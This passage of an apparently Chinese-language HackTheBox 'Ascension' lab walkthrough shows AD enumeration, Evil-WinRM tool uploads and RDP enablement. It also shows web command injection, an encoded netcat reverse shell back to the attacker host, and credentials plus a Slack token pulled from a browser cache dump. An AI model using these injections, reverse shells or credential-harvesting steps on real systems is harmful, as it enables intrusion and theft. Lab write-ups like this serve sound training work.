2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8903577-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.9059868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.9059868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.9059868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.9059868-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0153500-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0153500-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0153500-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0309756-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0466001-07:00|INFORMATION|Beginning LDAP search for daedalus.local Configuration NC
2026-03-25T01:24:59.0466001-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.0934741-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.1715968-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.1715968-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.1715968-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.1715968-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.3122205-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.3278464-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.3278464-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.3278464-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:59.9683892-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-03-25T01:24:59.9683892-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-03-25T01:25:00.8902697-07:00|INFORMATION|Consumers finished, closing output channel
2026-03-25T01:25:00.9215772-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2026-03-25T01:25:01.0472107-07:00|INFORMATION|Status: 307 objects finished (+307 153.5)/s -- Using 86 MB RAM
2026-03-25T01:25:01.0472107-07:00|INFORMATION|Enumeration finished in 00:00:02.6463977
2026-03-25T01:25:01.1408818-07:00|INFORMATION|Saving cache with stats: 17 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2026-03-25T01:25:01.1877619-07:00|INFORMATION|SharpHound Enumeration Completed at 1:25 AM on 3/25/2026! Happy Graphing!
```

### download
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> download 20260325013535_BloodHound.zip
```

## nltest /dsgetdc
```bash
*Evil-WinRM* PS C:\Users\Public> nltest /dsgetdc:megaairline.local
 
           DC: \\DC2.megaairline.local
      Address: \\192.168.11.201
     Dom Guid: 30af30a8-6272-4195-90ac-0e4ab6b5c668
     Dom Name: megaairline.local
  Forest Name: megaairline.local
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 0x20000
The command completed successfully
```



## powerview
### upload
```bash
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/PowerSploit/PowerView.ps1                         
Info: Uploading /home/kali/Desktop/tools/PowerSploit/PowerView.ps1 to C:\Users\Public\PowerView.ps1                                
Data: 1027028 bytes of 1027028 bytes copied                                   
Info: Upload successful!
```

### import
```bash
import-module .\PowerView.ps1
```

### MapDomainTrust(<font style="color:rgb(0, 128, 0);background-color:rgba(17, 17, 51, 0.02);">域信任关系</font>)
```bash
*Evil-WinRM* PS C:\Users\Public> Invoke-MapDomainTrust


SourceName      : daedalus.local
TargetName      : megaairline.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 10/10/2020 5:48:47 PM
WhenChanged     : 3/25/2026 4:15:13 AM
```

## 添加rdp用户组
```bash
net localgroup "Remote Desktop Users" Administrator /add
```

## 启用远程桌面服务
```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
```

## 远程控制
> 连接即可看见该页面
>

```bash
xfreerdp /u:'DAEDALUS\Administrator' /p:'pleasefastenyourseatbelts01!' \
    /v:192.168.10.6 \
    /proxy:socks5://127.0.0.1:1080 \
    /cert:ignore /dynamic-resolution
```

![](/image/hackthebox-prolabs/Ascension-6.png)

# ms01.megaairline.local-192.168.11.210
## IP
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> ping ms01.megaairline.local

Pinging ms01.megaairline.local [192.168.11.210] with 32 bytes of data:
Reply from 192.168.11.210: bytes=32 time<1ms TTL=128
Reply from 192.168.11.210: bytes=32 time<1ms TTL=128
Reply from 192.168.11.210: bytes=32 time<1ms TTL=128
Reply from 192.168.11.210: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.11.210:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

## WEB
> 通过凭据elliot/84@m!n@9 登录web服务
>

![](/image/hackthebox-prolabs/Ascension-7.png)

### 添加bash脚本
![](/image/hackthebox-prolabs/Ascension-8.png)

![](/image/hackthebox-prolabs/Ascension-9.png)

```bash
foo || type c:\users\elliot\desktop\flag.txt || foo
```

### 执行脚本
![](/image/hackthebox-prolabs/Ascension-10.png)



## Getflag
![](/image/hackthebox-prolabs/Ascension-11.png)

```bash
ASCENSION{n0t_so_s3cR3t_H1sToRy}
```

## 反弹shell
### 上传caddy-DC01
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/caddy/caddy.exe
```

### 上传nc-DC01
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /home/kali/Desktop/tools/netcat/nc64.exe
```

### 开放端口
```bash
netsh advfirewall firewall add rule name="Caddy7777" protocol=TCP dir=in localport=7777 action=allow
netsh advfirewall firewall add rule name="nc4444" protocol=TCP dir=in localport=4444 action=allow
```

### 运行caddy
```bash
.\caddy.exe file-server --listen :7777 --root . --browse
```

### 下载nc
```bash
iwr -uri http://192.168.11.6/nc64.exe -outfile c:\inetpub\wwwroot\nc.exe
```

### DC01监听端口-rdp
```bash
.\nc64.exe -nlvp 4444
```

### 生成payload
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# printf 'iwr -uri http://192.168.11.6/nc64.exe -outfile c:\inetpub\wwwroot\nc64.exe' | iconv -t UTF-16LE | base64 -w0
aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAxAC4ANgAvAG4AYwA2ADQALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGMAOgBcAGkAbgBlAHQAcAB1AGIAXAB3AHcAdwByAG8AbwB0AAoAYwA2ADQALgBlAHgAZQA=                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# printf 'c:\inetpub\wwwroot\nc64.exe 192.168.11.6 4444 -e cmd' | iconv -t UTF-16LE | base64 -w0
YwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQACgBjADYANAAuAGUAeABlACAAMQA5ADIALgAxADYAOAAuADEAMQAuADYAIAA0ADQANAA0ACAALQBlACAAYwBtAGQA   
```

### 执行回连
```bash
foo || powershell -c "iwr http://192.168.11.6:7777/nc64.exe -o C:/windows/temp/nc64.exe" || foo
```

```bash
foo || C:/windows/temp/nc64.exe 192.168.11.6 4444 -e cmd || foo
```

### getshell
![](/image/hackthebox-prolabs/Ascension-12.png)

## 信息收集
### Downloads目录
![](/image/hackthebox-prolabs/Ascension-13.png)

### ADPI目录
![](/image/hackthebox-prolabs/Ascension-14.png)

### 7
#### 存放web目录
```bash
copy "C:\Users\elliot\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\https_app.slack.com_0.indexeddb.blob\1\00\7" c:\inetpub\wwwroot\7.txt
```

#### 文件读取
> 关键账号密码：
>
> MS01 admin account and password:
>
> elliot
>
> LetMeInAgain!
>

```bash
ÿÿ
o"activityo"hasMoreF"itemsa @  "	isLoadingF"
isPageViewT"oldestUnreadTs0"selectedEnterpriseTeamId" {"
activityFocuso"focusKey0{"adminInviteso"
cursorMark_"sortBy"date_create"sortDir"DESC"requestsa @  "pendinga @  "accepteda @  {"
allThreadso"threads_"hasMoreT"cursorTs_"maxTs_"	refreshId_"totalUnreadReplies_"totalNewThreads_"allThreadsRefreshCounterI "focusRequestedThreadKey_"manuallyMarkedUnread_{
"
allUnreadso"
hasUnreadsF"hasUnreadThreadsF"threadsMentionCountI "threadsMentionCountByChannelo{ {"appsInChannelso{ "approvedExternalTeamso{  cb o a r d s o"boardsByChannelo{ "	boardInfoo{ "itemso{ "dndo{ {"bootDatao"(feature_display_email_addresses_to_radioF"#feature_icon_button_aria_label_i18nF"feature_alt_channels_reducerF"feature_jsf_1619T"feature_desktop_lazy_load_emojiF"feature_edu_88_gaT"feature_add_member_stats_apiF"$feature_member_analytics_permissionsF"#feature_bulk_user_reactivation_gridT"-feature_builder_multistep_collaborators_modalF"3feature_builder_allow_custom_time_scheduled_triggerT"!feature_builder_scheduled_triggerT"*feature_builder_message_button_helper_textF"#feature_builder_creation_org_policyT"feature_builder_extensionsT"$feature_builder_extension_steps_prefT"$feature_builder_access_error_contentF"'feature_builder_paginate_workflows_listF"feature_builder_step_libraryT"&feature_builder_team_apps_translationsF"$feature_builder_apps_collection_linkF"+feature_apps_can_submit_with_workflow_stepsT"feature_builder_feedback_buttonF"&feature_builder_message_step_rich_textT"feature_chime_access_checkT"feature_app_views_v1T"feature_audit_logs_viewF"!feature_audit_logs_view_workspaceF"!feature_org_teams_in_local_configT"&feature_data_location_new_translationsF""feature_default_browser_control_v2T"feature_accessible_selectsT"feature_select_on_tabT"feature_pronouns_in_profileF"'feature_builder_disable_global_triggersT",feature_workflow_builder_enabled_org_settingT"feature_builder_can_accessF"*feature_always_show_archive_channel_optionT"#feature_org_dashboard_gantry_accessF" feature_org_dash_gantry_redirectF"+feature_org_dashboard_gantry_apps_migrationF"feature_info_barriersF"/feature_mpdm_to_private_channel_conversion_prefF"feature_day2_share_modalF"feature_granular_dndF"feature_custom_dnd_translationsF"5feature_informative_announce_only_footer_translationsF"feature_context_bar_tz_issuesT"feature_newxp_4401T"feature_newxp_4281T"feature_newxp_3848T"feature_day1_convoT"feature_day1_comfy_sidebar_copyF"!feature_day1_creator_landing_copyF"feature_channel_browser_day1T"feature_banner_app_recsT"feature_copy_joiner_flowT"feature_approved_orgsF"feature_newxp_3279T"feature_newxp_4160T"feature_newxp_4153T"feature_newxp_4202T"feature_newxp_4313F"feature_tinyspeckF"feature_qr_code_inviteF"$feature_generate_lightweight_dm_linkF"feature_connect_dm_early_accessT"!feature_disconnect_lightweight_dmF"feature_olug_esc_channels_workT".feature_olug_remove_required_workspace_settingF"+feature_data_table_in_org_level_user_groupsF"feature_org_settings_m11nF"$feature_deprecate_get_member_by_nameF"feature_unknown_filesT"feature_unknown_messagesT"feature_add_message_perfT"feature_fix_custom_emoji_errorsT"feature_modern_delete_fileT"feature_copy_channel_linkT"feature_collapse_reactionsF"feature_ia_status_buttonT"feature_full_profile_linkT"feature_print_pdfF"feature_safari10_deprecationT""feature_safari10_deprecation_modalT""feature_safari10_deprecation_blockT"feature_desktop460_deprecationF"$feature_desktop460_deprecation_blockF"feature_email_workflowF"feature_wider_reaction_tipF"feature_file_picker_searchF"feature_sort_by_recency_post_v1F"feature_send_failed_toastF"feature_audio_playerF"feature_eagerly_mark_broadcastsF" feature_show_replies_immediatelyF"feature_composer_escape_hatchF"%feature_composer_email_classificationF"'feature_amazon_a11y_custom_status_emojiT"feature_bye_slackbot_helpT"feature_all_dm_mute_botsT"feature_file_threadsT"feature_broadcast_indicatorT"feature_new_replies_after_bcastT"feature_sonic_emojiT"feature_emoji_12F"feature_email_ingestionF"feature_attachments_inlineF"feature_fix_filesT"feature_aaa_admin_apisT"#feature_remove_actions_from_sidebarF"feature_shortcuts_v2_educationT"feature_pad_1534F"#feature_shortcuts_menu_cleanup_i18nF"feature_app_launcher_add_iconF"feature_app_launcher_bannersF"&feature_app_launcher_search_paginationF"&feature_channel_sidebar_drafts_sectionT"feature_navigate_historyT"feature_i18n_draftsF"feature_composer_ura_mpdmT"feature_recent_status_deleteF"feature_compose_flowF"feature_compose_flow_xwsT" feature_faster_count_all_unreadsT"feature_sonic_user_groupsT"/feature_channel_selector_for_team_guests_updateT"feature_sk_data_table_a11yF"-feature_sk_data_table_pinned_rows_and_columnsF"feature_desktop_symptom_eventsF" feature_data_residency_debuggingF"(feature_new_subteam_linked_channel_limitT"feature_subteam_user_limitT""feature_ent_admin_approved_apps_v2T" feature_dashboard_sortable_listsF"!feature_sk_loading_button_motionsT"feature_sk_base_iconT"!feature_sk_basic_select_arialabelF"feature_sk_required_arialabelF"feature_ce_eng_connect_dmsT"feature_ce_eng_search_demoF"feature_ce_eng_help_vitessF"feature_ce_eng_verified_ticketsF"feature_app_dir_phoenixF"!feature_shared_channels_multi_orgF"&feature_shared_channels_multi_org_mpimT")feature_shared_channels_multi_org_mpim_feT"'feature_chat_mpim_open_refactor_fe_copyT"*feature_find_an_admin_disconnect_explainerF",feature_shared_channels_multi_org_invites_beT"(feature_shared_channels_legacy_reconnectT"3feature_shared_channels_multi_org_qa_limit_overrideF"*feature_multi_workspace_shared_channels_beF" feature_esc_to_mwsc_prototype_beF"feature_mwsc_xws_to_escF"feature_revoke_esc_invites_feF"feature_mwsc_esc_to_xwsF"feature_remove_double_ringsF"feature_remove_double_diamondsF"feature_channels_view_in_mscF"%feature_shared_channels_emoji_delightT"!feature_create_private_c_channelsF"feature_gdpr_user_join_tosT""feature_user_invite_tos_april_2018T"'feature_no_more_get_originating_team_feT"feature_roles_are_fresh_phase_1F".feature_search_enterprise_return_correct_countF""feature_channel_mgmt_message_countF"3feature_aops_3320_return_user_ids_and_error_stringsT"feature_funnel_cakeF"feature_neue_typeF"feature_cust_acq_i18n_tweaksF"%feature_whitelist_zendesk_chat_widgetF"feature_commendations_spyT"feature_xws_i18nF"feature_use_imgproxy_resizingT"%feature_share_mention_comment_cleanupF"feature_search_empty_add_emojiF"feature_boards_i18nF"feature_disable_bk_in_threadT"feature_new_locale_toastT"feature_channel_exportsF""feature_docs_mentions_and_channelsF"%feature_calls_survey_request_responseT"feature_token_ip_whitelistT"feature_sidebar_theme_undoT"#feature_allow_intra_word_formattingT"$feature_i18n_channels_validate_emojiT"feature_fw_eng_normalizationT"feature_slim_scrollbarF"feature_primary_searchF"feature_modern_soundsT"feature_quick_copy_code_blocksT"feature_steeple_churchT"feature_steeple_church_linkT"feature_steeple_church_extT"feature_strollers_to_perchT"feature_file_browser_v2F"feature_people_searchF"feature_react_messagesT"feature_edge_upload_proxy_checkT"feature_unread_counts_delayT"$feature_legacy_file_upload_analyticsT"#feature_mpdm_limit_channel_creationF"feature_snippet_modes_i18nF"+feature_ekm_message_revocation_polling_testF"feature_team_admins_list_apiT"feature_moved_detailsF"feature_alt_members_reducerF"feature_ms_latestT"feature_guests_use_entitlementsT"feature_rooms_join_apiT"feature_rooms_join_urlF"$feature_calls_sip_integration_labelsF"feature_tasks_v1_copyF"feature_calls_conversationsF"(feature_custom_status_calendar_sync_copyT"#feature_custom_status_calendar_syncT" feature_mask_undocumented_errorsT"feature_app_actions_admin_pagesT"feature_app_views_remindersT"feature_reminders_org_shardT"+feature_reminders_grid_migrations_org_shardT"feature_blocks_reminders_listF"feature_message_blocksF"feature_silence_app_dmsF"feature_set_tz_automaticallyT"&feature_confirm_clear_all_unreads_prefT"feature_block_mountsT"feature_attachments_v2T""feature_block_kit_expandable_blockF"feature_group_blockF"feature_block_kit_deep_linksT"'feature_show_block_kit_in_share_dialogsF"feature_block_kit_user_blockF"feature_block_kit_radio_buttonsT"feature_mrkdwn_on_radio_buttonT"feature_block_kit_tableF"%feature_checkboxes_radios_in_messagesT"+feature_input_block_pti_wfb_dispatch_actionT"!feature_input_blocks_emit_actionsT"$feature_block_kit_full_actions_stateT" feature_input_blocks_in_app_homeT" feature_input_blocks_in_messagesF"!feature_block_kit_full_view_stateT".feature_block_kit_action_section_in_view_stateT")feature_block_kit_state_in_blocks_actionsT"8feature_block_kit_empty_state_translation_for_view_stateT"!feature_views_app_opt_out_tda_devT""feature_views_app_opt_out_tda_prodT"%feature_multiselects_in_actions_blockF""feature_block_kit_range_datepickerF"8feature_delete_app_homes_associated_with_deleted_serviceF"feature_block_kit_timepickerT"#feature_block_kit_timepicker_remindT""feature_block_kit_datepicker_inputT"#feature_block_kit_remount_on_updateF"feature_block_kit_app_betaT"feature_add_app_home_team_nameF"feature_beacon_js_errorsF"feature_beacon_js_admin_errorsF"#feature_user_app_disable_speed_bumpT""feature_tractor_shared_invite_linkT"feature_newxp_2119T"'feature_tractor_backup_channelname_copyT"!feature_degraded_rtm_always_failsF"-feature_apps_manage_permissions_scope_changesT" feature_reminder_cross_workspaceT"feature_p2pF"feature_classic_navT"feature_new_reactionsT"feature_pages_exampleF"feature_sonic_pinsT"feature_sonic_video_placeholderT"feature_iap1F"
feature_ia_gaT"feature_ia_debug_offF"feature_ia_i18nT"feature_ia_themesT"feature_ia_member_profileT"!feature_workspace_scim_managementF"feature_unified_memberT"feature_turn_mpdm_notifs_onT"'feature_desktop_reload_on_generic_errorT"feature_desktop_extend_app_menuF"&feature_desktop_restart_service_workerF",feature_desktop_system_notification_playbackF"feature_a11y_dyslexicF"feature_doloresF"(feature_desktop_force_production_channelF"feature_desktop_logs_uploadT"feature_macos_disable_hwT"feature_verified_orgs_beF"feature_at_here_warningF"feature_bots_not_membersT"feature_wta_stop_creationT"feature_m11n_channel_detailsT" feature_platform_deprecations_feT"feature_channel_actionsT"feature_shortcuts_promptT" feature_new_color_picker_stringsF"feature_accessible_dialogsT")feature_accessible_emoji_skin_tone_pickerT"*feature_calls_clipboard_broadcasting_optinT"feature_screen_share_needs_aeroF"feature_accessible_fs_dialogsT"feature_channel_header_labelsF" feature_trap_kb_within_fs_modalsT"feature_modern_image_viewerT"feature_emoji_by_idT"feature_mc_migration_bannerT"feature_aria_application_modeF"+feature_update_multiworkspace_channel_modalT"'feature_modern_request_workspace_dialogT"$feature_workspace_apps_manage_gantryT"*feature_workspace_apps_manage_gantry_v2_r1T"#feature_app_admin_buttons_speedbumpT"&feature_app_admin_buttons_speedbump_v2F"feature_modern_profile_flexpaneT"feature_scg_conversion_channelsT"Afeature_enterprise_retention_allow_override_on_org_level_channelsF"3feature_enterprise_retention_admin_retention_by_ccmF"feature_exports_filterT"feature_track_time_spentT"#feature_channel_invite_tokenizationT"feature_imports_cancelT"feature_email_workobject_uiF"feature_email_notifyF"feature_email_force_downloadT"feature_office_directoryF"#feature_calendar_simple_agenda_viewF"feature_team_themesF"feature_unfurl_metadataF"'feature_paperclip_coachmark_experimentsT"feature_plus_menu_add_apps_linkF",feature_rename_channel_disable_feedback_i18nF"feature_recent_files_omnipickerF"feature_recent_desktop_filesF" feature_email_file_unfurl_formatF"feature_link_protocol_betaF")feature_stripe_light_legacy_purchase_modeF""feature_checkout_force_into_legacyF" feature_sonic_placeholder_labelsT"feature_sonic_esc_creationT")feature_dangerously_guard_ia_translationsF"feature_ia_context_menusT"feature_ia_layoutT"!feature_misc_ia_a11y_translationsF"feature_threaded_call_blockF"2feature_enable_read_time_validations_for_shortcutsT"7feature_message_actions_in_app_actions_framework_clientT":feature_message_actions_in_app_actions_framework_developerT"(feature_slack_message_attachment_tooltipF"&feature_enterprise_mobile_device_checkT"feature_newxp_4402T")feature_shared_channels_custom_emojis_urlF"#feature_new_copy_for_identity_basicF"$feature_sonic_leave_workspace_dialogT"&feature_shared_channels_new_user_trialT"%feature_shared_channels_inviter_trialF"-feature_sc_invite_join_pending_channel_actionF"*feature_shared_channels_multi_email_inviteT"$feature_shared_channels_90_day_trialT",feature_shared_channels_90_day_trial_inviterF"$feature_shared_channels_day1_creatorF"%feature_shared_channels_happier_pathsF")feature_late_payment_success_notificationF")feature_australia_tax_change_notificationF"!feature_shared_channel_invites_v2T""feature_better_invites_call_v2_apiT"/feature_shared_channels_invite_create_educationT"8feature_shared_channels_invite_email_bounce_notificationT"feature_shared_channels_contentT"!feature_shared_channels_trial_eduT"9feature_user_invite_email_bounce_notification_translationT""feature_paid_onboarding_pageupdateT"feature_trace_webapp_initT"feature_trace_jq_initT"feature_trial_end_l10nT"feature_seven_days_email_updateF""feature_trial_ending_email_updatesT" feature_workspace_menu_plan_infoT"feature_partner_terms_i18nF"feature_partner_faq_i18nT"feature_highlight_paid_featuresF""feature_trial_expiration_date_i18nT"%feature_stripe_completely_down_bannerF".feature_fair_billing_detail_invoice_statementsF".feature_checkout_zip_autocomplete_translationsT"$feature_billing_member_email_updatesF"%feature_fair_billing_backend_refactorT"feature_uae_tax_id_collectionT"feature_chile_tax_id_collectionT"feature_ksa_tax_id_collectionT")feature_indonesia_tax_change_notificationF" feature_indonesia_tax_assessmentF"1feature_enterprise_analytics_2019_q3_enhancementsF"!feature_modernize_org_dash_chartsT"$feature_modernize_org_team_analyticsF"$feature_messages_from_apps_analyticsF"feature_org_level_appsF"feature_org_level_apps_customF"!feature_org_level_apps_admin_betaF"feature_sso_validate_audienceT"feature_channel_sectionsT",feature_channel_sections_sidebar_behavior_uiF""feature_analytics_scim_fields_paidF" feature_google_directory_invitesF"%feature_migrate_google_directory_apisT""feature_search_results_virtualizedF"feature_show_email_forwarded_byF"#feature_new_enough_periodic_reloadsF"!feature_builder_workflow_activityT"%feature_builder_export_form_csv_adminT"feature_header_blockT"feature_header_block_bkbT"feature_rate_limit_app_creationT"feature_giphy_shortcutT"feature_download_finder_updateT"feature_share_modal_dialogF"#feature_onedrive_error_translationsT"feature_channel_sidebar_summaryF"feature_browser_pickerF"feature_edu_101T"feature_newxp_4688T"feature_app_dir_gran_bot_submitT"feature_app_dir_workflow_stepsT"$feature_app_dir_workflow_steps_promoT"feature_app_listing_refreshT""feature_app_listing_refresh_scopesT"'feature_app_listing_refresh_org_deploysF" feature_app_listing_refresh_pt_2T"feature_hc_updated_titleF"feature_parsec_methodsF"feature_soul_searchersF"feature_snd_query_refinementsT"feature_email_classificationT"&feature_primary_owner_consistent_rolesT"%feature_invite_to_channel_by_email_uiT"feature_edu_110T"feature_siws_linksF"feature_locale_it_ITF"feature_locale_ko_KRT"feature_locale_ru_RUF"feature_locale_zh_CNF"feature_locale_zh_TWF"&feature_search_filter_file_attachmentsF"feature_mpdm_audience_expansionT"feature_newxp_4312F"!feature_ce_eng_search_zendesk_apiF"feature_bk_error_messagingT"feature_large_emoji_in_tooltipT"feature_newxp_3795F" feature_new_notifications_stringF"6feature_apps_event_authorizations_list_endpoint_a7e51fT"*feature_guard_channel_details_translationsF"feature_verified_orgs_feF"feature_refine_your_search_i18nT"feature_newxp_4597T"feature_newxp_4597_copyF"feature_file_actions_fixF"feature_inline_feedbackF"feature_edu_182T"(feature_credit_banner_basic_translationsF"feature_idr_backfillsF"feature_edu_187T" feature_add_to_channel_prototypeF"feature_stripe_hack_migrationF"(feature_paid_benefits_alert_translationsT"6feature_plan_benefits_day_one_trial_header_update_i18nT"feature_modern_team_site_navF"$feature_trial_awareness_translationsT"+feature_calls_location_warning_translationsF" feature_esc_who_can_request_prefF"(feature_sidebar_trial_badge_translationsF"&feature_context_menu_keyboard_shortcutT"feature_edu_196F"feature_interactive_separatorsF"!feature_search_aria_initial_stateT"feature_free_trial_chatT"feature_uk_vat_hmrc_validationF"feature_invited_users_countF"feature_edu_162F""feature_bulk_user_reactivation_apiT"%feature_force_validators_dark_testingF"feature_atlassian_offerT"feature_blog_on_dotcomT"feature_blog_on_dotcom_dbT"feature_careers_remote_updateT"feature_blog_on_dotcom_fixesT"feature_blog_on_dotcom_relatedT"-feature_careers_remote_update_additional_copyT"feature_engage_users_lpF"&feature_shared_channels_beta_whats_newT"(feature_frontiers_product_bundle_releaseT"/feature_first_message_notification_translationsF"feature_builtin_mcrouterF"%feature_deprecate_sidebar_app_promptsT"+feature_managed_connections_message_promptsF"feature_hot_team_apc_db_setT"feature_im_channel_row_cacheF""feature_user_fetch_with_share_typeT",feature_esc_grid_migrations_format_translateF"feature_app_profile_cardT" feature_as_consul_dual_read_rts1F"feature_as_grpc_sidecar_consulT"feature_as_qos_low_kill_switchT",feature_eventlog_member_joined_channel_limitT"feature_as_grpc_address_listT"feature_as_grpc_retriesT"#feature_as_nonblocking_channel_joinF"feature_as_log_user_profileF"feature_app_launcher_highlightsT"!feature_service_mesh_push_enabledT")feature_general_channel_add_members_asyncT"9feature_channels_members_block_optimistic_master_fallbackF"feature_rel_notes_sec_fixesF"feature_ui_generatorF"feature_onetrust_cookie_policyT"!feature_rel_notes_product_updatesF""feature_proj_customer_stories_2020F"!feature_whats_new_shared_channelsT"#feature_proj_slack_connect_featuredT"feature_proj_solutions_sales_lpF"feature_res_hub_i18nT"feature_whats_new_shortcuts_gtmF" feature_users_count_latest_cacheF"(feature_users_count_latest_cache_compareF"feature_chanlatest_ubc_readsF""feature_message_fanout_force_errorF"feature_users_count_no_mentionsF"feature_mentions_flannel_startF"!feature_workflows_grid_migrationsT"feature_builder_block_kitF"feature_chat_login_eventsF"+feature_conversations_info_api_compare_demoF""feature_db_force_preferred_failureF""feature_mark_last_read_restructureT"$feature_shared_channels_member_limitF"!feature_flannel_no_stranger_usersF"$feature_sli_briefing_hidden_channelsF" feature_desktop_slacktoken_adminT"feature_desktop_browser_signinF")feature_no_clear_cache_on_loading_troubleF",feature_client_boot_better_esc_channel_fetchT",feature_email_billing_overcharged_tax_refundT"2feature_vat_receipts_include_regulatory_currenciesT"&feature_disable_dunning_auto_downgradeT"!feature_dark_mode_desktop_releaseT"feature_app_unfurls_everywhereF"feature_app_search_weights_v1F"feature_kafkagate_sidecarF"feature_mc_invites_subtabsF"'feature_turn_off_zendesk_email_matchingT"feature_sci_accept_validationF"feature_gg_downgradeF"(feature_org_level_apps_user_change_eventF""feature_channel_sections_edit_modeF",feature_channel_sections_downgrade_coachmarkF")feature_channel_sections_always_availableT"feature_proj_digital_campus_lpT"%feature_proj_solutions_engineering_lpF"7feature_mobile_min_app_version_backend_no_version_fetchF"+feature_enterprise_mobile_versions_list_apiT""feature_channel_sections_show_moreF"feature_api_docs_flex_layoutF"feature_api_docs_intra_navF"feature_web_api_tester_newF" feature_api_deprecation_warningsT"feature_api_deprecation_errorsT"feature_phase3_languagesF"feature_new_locale_toast_ko_KRT".feature_channel_sections_keyboard_reorder_a11yF" feature_unrolled_message_actionsF"feature_section_all_unreadsF"feature_slash_feedback_disabledF"feature_help_learning_modalF"+feature_bot_user_id_lookup_for_app_profilesF"(feature_help_learning_modal_consult_cardF"&feature_app_collection_atlassian_promoT"%feature_sc_invite_open_channel_actionT"feature_help_menu_app_updateF"(feature_auth_get_team_user_replica_readsF"&feature_ext_shared_chan_blck_file_prevF"app"client"	api_token"oxoxc-1427058387462-1446438551793-1430720434261-3319028e1153b01a901a6132e22ce71be64cbda938e762464ae44241f0877c5d"user_id"U01D4CWG7PB"
version_ts"
